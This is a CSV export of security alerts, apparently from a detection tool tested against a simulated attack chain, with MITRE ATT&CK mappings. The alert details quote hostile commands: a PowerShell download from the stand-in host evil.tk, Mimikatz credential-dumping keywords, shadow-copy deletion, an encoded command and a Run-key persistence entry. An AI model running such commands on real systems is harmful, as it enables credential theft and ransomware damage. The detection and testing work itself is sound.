id,timestamp,event,severity,status,mitre_id,tactic,host,user,ip,country,vt_score,abuse_score,threat_risk,detail
CHAIN-381785,2026-06-07 18:28:46,"⚡ Multi-Stage Attack Chain (6 events, score 154)",CRITICAL,OPEN,TA0001,Attack Chain,nani123,katre,-,-,0,0,CRITICAL,"Chain Score    : 154 | Events         : 6 in 300s window | Unique Tactics : 6 | Tactics Path   : Persistence → Defense Evasion → Command & Control → Execution → Impact | MITRE IDs      : T0000, T1547.001, T1027, T1105, T1059.001, T1490 | Attack Stages  : |   1. Suspicious EXE File Detected |   2. Registry Persistence Detected |   3. Suspicious PowerShell Detected |   4. Suspicious PowerShell Detected |   5. Suspicious PowerShell Detected |   6. Suspicious PowerShell Detected"
ALT-73190599,2026-06-07 18:28:46,Suspicious PowerShell Detected,HIGH,OPEN,T1490,Impact,nani123,katre,-,-,0,0,HIGH,[Shadow copy deletion (ransomware)] | Process : powershell.exe (PID 3276) | CMD     : C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command Write-Host vssadmin delete shadows
ALT-58093288,2026-06-07 18:28:46,Suspicious PowerShell Detected,HIGH,OPEN,T1490,Impact,nani123,katre,-,-,0,0,LOW,[Shadow copy deletion (ransomware)] | Process : powershell.exe (PID 3276) | CMD     : C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command Write-Host vssadmin delete shadows
ALT-95630415,2026-06-07 18:28:40,Suspicious PowerShell Detected,CRITICAL,OPEN,T1059.001,Execution,nani123,katre,-,-,0,0,CRITICAL,[Mimikatz keyword in PowerShell] | Process : powershell.exe (PID 25664) | CMD     : C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command Write-Host mimikatz sekurlsa logonpasswords
ALT-12721288,2026-06-07 18:28:40,Suspicious PowerShell Detected,CRITICAL,OPEN,T1059.001,Execution,nani123,katre,-,-,0,0,LOW,[Mimikatz keyword in PowerShell] | Process : powershell.exe (PID 25664) | CMD     : C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command Write-Host mimikatz sekurlsa logonpasswords
ALT-32592271,2026-06-07 18:28:26,Suspicious PowerShell Detected,LOW,OPEN,T1105,Command & Control,nani123,katre,-,-,0,0,LOW,[PowerShell remote file download (IWR)] | Process : powershell.exe (PID 8852) | CMD     : C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command Invoke-WebRequest -Uri http://evil.tk/payload
ALT-23755710,2026-06-07 18:28:26,Suspicious PowerShell Detected,LOW,OPEN,T1105,Command & Control,nani123,katre,-,-,0,0,LOW,[PowerShell remote file download (IWR)] | Process : powershell.exe (PID 8852) | CMD     : C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command Invoke-WebRequest -Uri http://evil.tk/payload
ALT-18272699,2026-06-07 18:28:19,Suspicious PowerShell Detected,MEDIUM,OPEN,T1027,Defense Evasion,nani123,katre,-,-,0,0,MEDIUM,[Encoded PowerShell command (obfuscation)] | Process : powershell.exe (PID 2188) | CMD     : powershell -NoExit -EncodedCommand cwBlAGMAcgBlAHQAcwA=
ALT-53634056,2026-06-07 18:28:19,Suspicious PowerShell Detected,MEDIUM,OPEN,T1027,Defense Evasion,nani123,katre,-,-,0,0,LOW,[Encoded PowerShell command (obfuscation)] | Process : powershell.exe (PID 2188) | CMD     : powershell -NoExit -EncodedCommand cwBlAGMAcgBlAHQAcwA=
ALT-67119231,2026-06-07 18:28:13,Registry Persistence Detected,LOW,OPEN,T1547.001,Persistence,nani123,katre,-,-,0,0,LOW,New registry autorun entry detected | Key   : Software\Microsoft\Windows\CurrentVersion\Run | Name  : EvilMalware | Value : C:\Users\katre\AppData\Local\Temp\evil.exe
ALT-61219830,2026-06-07 18:28:13,Registry Persistence Detected,LOW,OPEN,T1547.001,Persistence,nani123,katre,-,-,0,0,LOW,New registry autorun entry detected | Key   : Software\Microsoft\Windows\CurrentVersion\Run | Name  : EvilMalware | Value : C:\Users\katre\AppData\Local\Temp\evil.exe
ALT-15712803,2026-06-07 18:27:51,Suspicious EXE File Detected,LOW,OPEN,T0000,Unknown,nani123,katre,-,-,0,0,LOW,Suspicious EXE detected in untrusted path | File   : C:\Users\katre\AppData\Local\Temp\evil_payload5.exe | SHA256 : ab15a95de88ab0624307ae0e28e33375... | Score  : 100
ALT-20409268,2026-06-07 18:27:51,Suspicious EXE File Detected,LOW,OPEN,T0000,Unknown,nani123,katre,-,-,0,0,LOW,Suspicious EXE detected in untrusted path | File   : C:\Users\katre\AppData\Local\Temp\evil_payload5.exe | SHA256 : ab15a95de88ab0624307ae0e28e33375... | Score  : 100
